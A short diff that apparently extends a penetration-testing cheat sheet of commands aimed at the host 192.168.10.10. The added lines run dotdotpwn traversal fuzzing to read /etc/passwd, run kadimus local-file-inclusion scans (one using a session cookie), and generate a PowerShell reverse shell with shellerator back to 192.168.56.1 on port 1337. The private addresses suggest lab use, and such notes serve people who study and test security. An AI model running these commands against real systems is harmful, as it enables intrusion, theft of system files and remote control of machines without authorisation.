@@ -103,3 +103,9 @@ enum -P 192.168.10.10
 enum4linux -a 192.168.10.10
 amap -d 192.168.10.10 4455
 nikto -host 192.168.10.10
+dotdotpwn -m payload -h 192.168.10.10 -x 80 -p request.req -k 'root:' -f /etc/passwd
+dotdotpwn -m stdout -d 5 -f /etc/passwd
+kadimus -u 'http://192.168.10.10/?page=file1.php'
+kadimus --cookie 'PHPSESSID=qsh5s21mo54qds7v5384f1q34' -u 'http://192.168.10.10/?page=file1.php'
+shellerator --reverse-shell --ip 192.168.56.1 --port 1337 --type powershell
+shellerator
